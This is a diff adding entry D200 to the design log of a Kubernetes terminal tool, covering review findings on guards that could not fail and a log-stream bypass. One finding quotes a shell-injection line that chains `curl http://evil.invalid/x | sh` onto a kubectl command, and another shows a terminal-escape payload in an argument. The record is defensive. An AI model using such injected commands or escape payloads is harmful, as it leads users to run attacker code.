@@ -221,6 +221,7 @@ its line moving with it.
 - [D197](#d197--the-log-streams-review-round-nine-findings-and-the-container-list-that-came-from-the-wrong-half-of-the-object-2026-08-30) — the log stream's review round: nine findings, and the container list that came from the wrong half of the object
 - [D198](#d198--the-two-reversals-the-operator-review-forced-a-secret-keeps-a-second-copy-of-itself-and-the-strip-that-made---yaml-not-the-object-2026-08-31) — the two reversals the operator review forced: a Secret keeps a second copy of itself, and the strip that made `--yaml` not the object
 - [D199](#d199--one-objects-own-story-the-flag-that-exists-so-a-redaction-has-a-caller-and-the-bound-that-costs-a-claim-2026-08-31) — one object's own story: the flag that exists so a redaction has a caller, and the bound that costs a claim
+- [D200](#d200--the-box-that-proved-its-own-thesis-against-itself-three-guards-that-could-not-fail-and-a-cluster-word-on-a-line-the-user-runs-2026-08-31) — the box that proved its own thesis against itself: three guards that could not fail, and a cluster word on a line the user runs
 
 ## Why it exists — where the gap is
 
@@ -17113,4 +17114,81 @@ startup ties four events in one second; the sort is stable, ties keep the
 server's order, and the server's order for one object is etcd key order, which
 is time *ascending* — the precise reverse of the heading, for the commonest
 block there is. Both were found by running it, neither by reading it.
+
+
+### D200 — the box that proved its own thesis against itself: three guards that could not fail, and a cluster word on a line the user runs (2026-08-31)
+
+Phase 6 family 3 was *"one transformation on a string"*, and its done-when is
+that a guard must be able to fail. It landed green — `just check` exit 0, 845
+tests — and then `tester` and `k8s-admin` read it in parallel and returned
+**fourteen findings, none of them a defect in product behaviour and three of
+them guards in this very box that cannot fail.** That is not an accident of this
+turn; it is the subject of the box arriving in the box.
+
+**The parser under ten guards went silent on three shapes, and silence printed a
+pass.** `type_header` required `<vis> struct Name {`. Measured, each with a
+text-carrying child hung off a watched type and no `impl Bounded`:
+`pub(super) struct X { component: String }` → **846 passed, 0 failed**;
+`pub(crate) struct X(String);` → **846 passed, 0 failed**. And `field_of` split a
+struct variant on `" { "` then once on `": "`, so a **one-line** variant yielded
+its first field and swallowed the rest into that field's *type string* — collapse
+`ContainerState::Waiting` onto one line (formatting only, semantics identical,
+and `rustfmt` produces exactly that shape when the body is under
+`struct_variant_width`), delete one `maybe(message, FREE_TEXT)`, and **all ten
+derived guards stay green with an unbounded `String` on a watched snapshot
+type**. Today's `Waiting` is multi-line by eleven characters of luck.
+
+**The fix is not three parser patches; it is refusing to return nothing.** A new
+guard matches every `struct`/`enum` declaration line in both product files and
+asserts each name is a key of `declared_types`, so an unparseable declaration is
+a red build rather than a skipped type — and it is deliberately written *not*
+through the parser it checks, because the first draft of it stayed green over the
+very shape it existed for. It caught a type the hour it was written.
+
+**The corpus sweep's canary was satisfied by the poison it was not testing.** The
+key poison was added a turn earlier after the sweep was found unable to fail on
+map keys; its canary asked whether *any* string in the cleaned tree began `[2J`,
+and every poisoned **value** does. Delete the key poison → green; delete it *and*
+reduce `clean`'s `Mapping` arm to values only → still green, over 92 objects and
+18 702 strings, printing the same reassuring counts. **A canary has to name the
+position it is a canary for.**
+
+**A cluster-supplied word reached a `$ kubectl` line with no `path_safe` check,
+and the user is the one who executes that line.** `Fetch::table` refused a kind
+whose group, version, plural and namespace were unsafe; `kind.kind` was checked
+by nothing. Measured against the real functions:
+`$ kubectl get pod; curl http://evil.invalid/x | sh # web -n default -o yaml`.
+`sanitize` removes the `ESC` and leaves every character a shell reads. A CRD
+cannot carry one — the API server validates `spec.names.kind` against a
+lowercase-alphanumeric-and-dash pattern, measured by dry-run — so the residual is an
+aggregated API server, and whether kube-apiserver validates an extension
+server's discovery `kind` was **not** measured. One clause at the root closed it
+without waiting for that answer, and a sweep of all **62 kinds the fixture
+cluster serves** refused **none** of them. The general lesson is the one the
+security gate half-states: the command log is display text *k8rs* never
+executes, which makes it the output with the **highest** consequence, not the
+lowest, because the reader is told to run it.
+
+**A door guard that reads one function body does not guard a `pub(crate)` door.**
+`log_stream` handed a raw `impl AsyncBufRead` to `main.rs`, and nothing forced a
+caller through `read_lines`: rewriting the `--follow` arm to decode the stream
+itself gave **868 passed, 0 failed** on a path through neither the strip, nor the
+`FREE_TEXT` cut, nor the per-line ceiling the security gate requires. The
+proposed fix — a source guard asserting `read_lines` appears beside
+`log_stream` — **would not have caught the attack that motivated it**, because
+the other arm still called it. So the door became a type: `log_stream` returns a
+private-field wrapper, `read_lines` is the only thing that takes one, and the
+test-only constructor makes a product-code bypass a release build that does not
+compile. **When a source guard and the compiler can both hold a rule, the
+compiler is the one that cannot be worded wrongly.**
+
+**And one doc that generalised a true measurement into a false claim.**
+`main.rs`'s `sanitize` was documented as a provable no-op because 18 717 strings
+that came through `k8s::text` were unchanged by it. True — and **argv never met
+`text`**: `k8rs --once --namespace $'PAY\e[2JMENTS'` reaches `sanitize` with the
+escape intact, and it is the only strip on that path. The measurement was right
+and the sentence drawn from it was not, which is
+[D136](#d136--three-claims-that-were-reasoned-instead-of-measured-and-the-one-sentence-that-catches-all-three-2026-08-21)
+in the one direction that is hardest to see: not a claim nobody measured, but a
+claim measured over one set and stated over a larger one.
 
